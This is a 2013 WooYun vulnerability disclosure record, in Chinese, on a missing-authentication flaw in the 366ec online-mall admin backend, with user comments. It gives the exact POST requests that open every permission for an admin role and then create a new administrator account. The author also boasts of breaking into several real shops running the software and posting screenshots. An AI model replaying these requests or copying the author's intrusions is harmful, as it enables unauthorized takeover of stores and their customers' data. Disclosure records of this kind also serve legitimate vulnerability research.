{"id": 9105, "wybug_id": "wooyun-2013-028437", "wybug_title": "某对外出售的大型商城系统一处未授权访问直接进后台（完整权限）", "wybug_corp": "366ec管家婆", "wybug_author": "飞黎", "wybug_date": "2013-07-10 17:20", "wybug_open_date": "2013-10-08 17:21", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏认证", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-10-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这是个卖商城系统的。。售价那么贵，屌丝哪里买得起。。果断搞之改页头页脚代码，改用户密码，改订单状态，改商品，通通搞定~ 详细说明：  两处未验证授权，影响目测超大，N家大型商城都会沦陷。。。这个商城系统逻辑很有问题，管理员有角色分组，每个角色权限默认都是没有。。。思路这样，post修改管理员组的默认权限为全开，然后新建个管理员组的账户，然后登录之。。 \nurl:http://b2c.366ec.com/admin/controls/PermissionHandler.ashx referer:http://b2c.366ec.com/admin/Permission/RolePermissionManage.aspx?RoleId=1   post:type=save_rolepermission&RoleID=1&Ids=19%3A3298536980849%7C20%3A17%7C66%3A17%7C144%3A21%7C21%3A17%7C22%3A15%7C23%3A393231%7C24%3A15%7C25%3A31%7C26%3A271%7C27%3A6291471%7C33%3A17%7C34%3A1%7C35%3A17%7C145%3A17%7C188%3A17182001615%7C41%3A1638913%7C42%3A5%7C45%3A2162719%7C46%3A65567%7C47%3A2162703%7C153%3A15%7C48%3A31%7C57%3A15%7C58%3A143%7C59%3A15%7C60%3A2079%7C61%3A2063%7C62%3A180388609754757%7C63%3A140737490452497%7C64%3A8392713%7C161%3A39651121399429%7C162%3A35253074888325%7C163%3A68702799493%7C164%3A35184373137609%7C65%3A70368746668175%7C152%3A145%7C67%3A31%7C69%3A395279%7C146%3A17%7C70%3A395273%7C147%3A17%7C80%3A15%7C81%3A65551%7C82%3A65551%7C83%3A1%7C84%3A2053%7C85%3A17%7C86%3A426005%7C91%3A412316880005%7C92%3A19073%7C165%3A1855425891461%7C166%3A206158449793%7C167%3A2336462228625%7C168%3A137438973065%7C169%3A137438973065%7C170%3A137438973065%7C171%3A137438973065%7C173%3A18561%7C174%3A18561%7C175%3A18561%7C176%3A18569%7C177%3A18569%7C94%3A137438955673%7C95%3A137438955673%7C96%3A137438955673%7C97%3A18569%7C98%3A18569%7C99%3A18569%7C100%3A18569%7C101%3A137%7C107%3A2109327%7C108%3A2097167%7C149%3A17%7C110%3A4111%7C111%3A17%7C112%3A8388623%7C113%3A8388623%7C114%3A8388617%7C115%3A8521749%7C116%3A2057%7C191%3A2109327%7C192%3A2097167%7C195%3A2109327%7C196%3A2097167%7C109%3A17%7C156%3A17%7C122%3A2065%7C123%3A17592186044417%7C124%3A17592186044417%7C125%3A129%7C126%3A17592186044545%7C127%3A17592186044545%7C128%3A17592186044545%7C129%3A129%7C130%3A17592186044545%7C131%3A2177%7C547%3A17592186044545%7C28%3A1%7C180%3A68702799495%7C181%3A2490511%7C182%3A145%7C185%3A2177%7C186%3A2177%7C187%3A129%7C29%3A17%7C30%3A4194305%7C31%3A2097153%7C32%3A17%7C136%3A2490383%7C137%3A15%7C138%3A2097167%7C139%3A9%7C140%3A105%7C141%3A9%7C142%3A5%7C\nreferer貌似也没验证，直接返回成功。。然后新建管理员账号，建在刚刚开好权限的那个组里\nurl:http://b2c.366ec.com/admin/controls/operdo.ashxreferer:http://b2c.366ec.com/admin/config/addoper.aspx?width=720&height=400&_=1373093738559  post:type=save_oper&username=test&role=1&status=1&realname=test&pwd=123456&usercode=1111\n返回成功，大快人心。。登录之\n\n----低级漏洞，但是影响力超大。。完整后台权限啊测试时用的是官方演示站，求别跨省。。   漏洞证明：  \n\n另外附上搞下的几个购买此系统商城的截图，就不告诉大家是哪个商城了。。这只是其中一部分小的，一部分小的。。\n\n\n\n\n\n   修复方案：  PS：这种厂商不应该通知，直接等90天公开算了。。找他们要提交，告诉我说提交没奖励，顶多买他们系统给优惠。。。。。。强烈建议解雇后台设计者，开发者，另外，听客服说他们有独立的安全检查小组，这小组吃空晌的么，强烈建议辞退。。PPS：既然厂商不给任何奖励，那就求乌云赐点rank，wb。。通用性软件再赐点RMB。。PPPS：下了那么大功夫做xss过滤，结果栽这上了。。   版权声明：转载请注明来源 飞黎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-07-11 21:44 |    \t\t怀念 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        )\t\t \n  厂商名称。。。标题，又是某，这个某。。。。好吧我不知道自己想说什么。。。    \n     2013-07-12 07:23 |    \t\t飞黎 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:13        | 一个会写代码的产品经理)\t\t \n  @怀念 好吧，厂商不能填某吧。。。    \n     2013-10-09 10:20 |    \t\t士大夫 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:37        | 杭州WEB安全小组)\t\t \n  没认领就已经修复了。    \n     2013-10-11 22:15 |    \t\t飞黎 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:13        | 一个会写代码的产品经理)\t\t \n  @士大夫 是的，巨坑爹    \n     2013-10-15 19:37 |    \t\t寻找弱口令 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我爱寻找弱口令)\t\t \n  我去，我以前等别的网站时记住的密码，到这里显出来了，可居然登上了。坑爹呀    \n     2013-10-16 22:53 |    \t\t飞黎 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:13        | 一个会写代码的产品经理)\t\t \n  @寻找弱口令 额，他演示站的登陆页面自动填写密码的。。。不是你的浏览器自动填的    \n     2013-10-17 19:57 |    \t\t寻找弱口令 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我爱寻找弱口令)\t\t \n  @飞黎 我去，这也太高端霸气上档次了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}